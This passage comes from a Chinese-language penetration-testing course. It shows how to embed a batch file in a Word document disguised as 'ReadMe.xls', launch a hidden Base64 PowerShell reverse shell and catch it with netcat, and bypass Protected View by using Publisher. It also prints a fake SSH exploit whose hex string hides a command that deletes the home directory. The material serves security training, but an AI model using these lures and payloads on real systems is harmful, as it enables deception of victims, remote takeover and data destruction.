
### *列表 399 - 启动 `cmd.exe` 的简单批处理文件*

接下来，我们将把上述脚本包含在一个 Microsoft Word 文档中。我们将打开 Microsoft Word，创建新文档，导航到“插入”选项卡，并点击“对象”菜单。在这里，我们将选择“从文件创建”选项卡，并选择我们新创建的批处理脚本 `launch.bat`：

![](img/ec25e59d75726b7041242a56d3376832_433_0.png)

[^357]: (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/dataxchg/about-dynamic-data-exchange?redirectedfrom=MSDN
[^358]: (SensePost, 2017), https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/
[^359]: (Microsoft, 2017), https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/ADV170021
[^360]: (Wikipedia, 2019), https://en.wikipedia.org/wiki/Object_Linking_and_Embedding
[^361]: (Wikipedia, 2019), https://en.wikipedia.org/wiki/Batch_file

![](img/ec25e59d75726b7041242a56d3376832_434_0.png)

我们还可以更改批处理文件在 Word 文档中的外观，使其看起来更无害。为此，我们只需勾选 *作为图标显示* 复选框并选择 *更改图标*，这将调出图 252 中看到的菜单框，允许我们进行修改：

![](img/ec25e59d75726b7041242a56d3376832_434_1.png)

尽管这是一个嵌入的批处理文件，Microsoft 允许我们为其选择不同的图标并输入标题，受害者看到的将是标题，而不是实际的文件名。在上面的示例中，我们选择了 Microsoft Excel 的图标以及名称 **ReadMe.xls**，以完全隐藏批处理文件，试图降低受害者的警惕性。接受菜单选项后，批处理文件将被嵌入到 Microsoft Word 文档中。接下来，必须诱使受害者双击它并接受图 253 中显示的安全警告：

![](img/ec25e59d75726b7041242a56d3376832_435_0.png)

![](img/ec25e59d75726b7041242a56d3376832_435_1.png)

一旦受害者接受了警告，**`cmd.exe`** 就会启动。再一次，我们拥有了执行任意程序的能力，必须将其转换为执行带有 Base64 编码命令的 PowerShell。这次转换非常简单，我们只需将 **cmd.exe** 更改为之前使用的 PowerShell 调用即可，如清单 400 所示。

```
START powershell.exe -nop -w hidden -e JABzACAAcAPAQgAEA4AQZQBAACQATwBIAGoAZQB...
```

*清单 400 · 启动反向 Shell 的批处理文件*

在嵌入更新后的批处理文件后，双击它将产生一个可用的反向 Shell。

```
kali@kali:~$ nc -lvnp 4444

listening on [any] 4444 ...

connect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 50115

Microsoft Windows [Version 10.0.17134.590]

(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Offsec>
```

*清单 401 · 从我们的 OLE 对象接收到的 Shell*

### 13.3.3.1 练习

- 1. 使用 PowerShell 载荷创建批处理文件并将其嵌入 Microsoft Word 文档中，以向你的 Kali 系统发送反向 Shell。

### 13.3.4 绕过受保护视图

当此 Microsoft Word 文档在本地提供时非常有效，但当通过电子邮件或下载链接从互联网提供时，我们必须绕过另一层保护，即 *受保护视图*，³⁶² 该视图会禁用文档中的所有编辑和修改，并阻止宏或嵌入对象的执行。

为了模拟这种情况，我们将包含嵌入批处理文件的 Microsoft Word 文档复制到我们的 Kali 机器上，并在 Apache 服务器上托管它。然后，我们可以从服务器下载该文档并在受害者的机器上打开它。此时，如图中 254 所示，*受保护视图* 已启用，我们无法执行批处理文件。

![](img/ec25e59d75726b7041242a56d3376832_436_0.png)

受害者可能会点击 *启用编辑* 并退出 *受保护视图*，但这种情况不太可能。理想情况下，我们宁愿完全绕过 *受保护视图*，一种简单的方法是使用另一个 Office 应用程序。

与 Microsoft Word 类似，Microsoft Publisher 允许嵌入对象，并且最终可以通过与 Word 和 Excel 完全相同的方式执行代码，但它不会为通过互联网传输的文档启用 *受保护视图*。我们可以使用之前应用于 Word 的策略来绕过这些限制，但缺点是 Publisher 的安装频率不如 Word 或 Excel 高。不过，如果你的指纹识别检测到安装了 Publisher，这可能是一个可行且更好的向量。

### 13.3.4.1 练习

- 1. 通过模拟从互联网下载 Microsoft Word 文档来触发受保护视图的保护。
- 2. 重用批处理文件并将其嵌入 Microsoft Publisher 文档中，以接收反向 Shell 到你的 Kali 系统。
- 3. 将文件移动到 Apache Web 服务器上，以模拟从互联网下载 Publisher 文档，并确认缺少受保护视图。

## 13.4 总结

客户端攻击向量特别阴险，因为它们利用的是客户端软件（如浏览器）中的弱点，而不是利用服务器软件。这通常涉及某种形式的用户交互和欺骗，以便客户端软件执行恶意代码。

这些攻击向量对攻击者特别有吸引力，因为它们不需要直接或可路由地访问受害者的机器。

³⁶² (Microsoft, 2019), https://support.office.com/en-us/article/what-is-protected-view-d6f09ac7-eeb9-4495-8e43-2bcdbcdb6653

![](img/ec25e59d75726b7041242a56d3376832_437_0.png)

在本模块中，我们描述了在此类攻击中需要考虑的一些重要因素，并演示了涉及恶意 HTML 应用程序和 Microsoft Word 文档的利用场景。

## 14. 查找公开漏洞利用

在本模块中，我们将重点介绍托管公开已知漏洞利用代码的各种在线资源。我们还将检查 Kali 中可用的离线工具，这些工具包含本地托管的漏洞利用代码。

### 14.1 注意事项

重要的是要理解，下载和运行公开漏洞利用可能会极大地危及运行该代码的任何系统。鉴于此，我们在执行前需要仔细阅读并理解代码，以确保没有负面影响。

例如，OpenOwn 是作为 SSH 的远程漏洞利用发布的。在阅读源代码时，我们注意到它要求 root 权限，这立刻引起了我们的警惕：

```
if (geteuid()) {

  puts("Root is required for raw sockets, etc.");

  return 1;

}
```

清单 402 · 在攻击机器上要求 root 权限的恶意 SSH 漏洞利用

进一步检查载荷发现了一个有趣的 jmpcode 数组：

```
[...]
char jmpcode[] =
"\x72\x6D\x20\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2F"
"\x64\x65\x76\x2F\x6e\x75\x6C\x6C\x20\x26\x26";
[...]
```

清单 403 · 恶意 SSH 漏洞利用的十六进制编码载荷

虽然它被伪装为 shellcode，但 jmpcode 字符数组实际上是一个包含恶意 shell 命令的十六进制编码字符串：

```
kali@kali:~$ python
>>> jmpcode = [
...   "\x72\x6D\x20\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2F"
...   "\x64\x65\x76\x2F\x6e\x75\x6C\x6C\x20\x26\x26"]
>>> print jmpcode
```
